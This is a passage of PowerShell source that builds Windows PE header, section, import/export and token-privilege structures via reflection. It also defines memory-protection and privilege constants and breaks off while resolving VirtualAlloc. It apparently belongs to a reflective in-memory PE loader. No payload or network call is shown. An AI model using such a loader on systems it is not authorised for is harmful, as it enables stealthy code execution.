        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        
        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()   
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
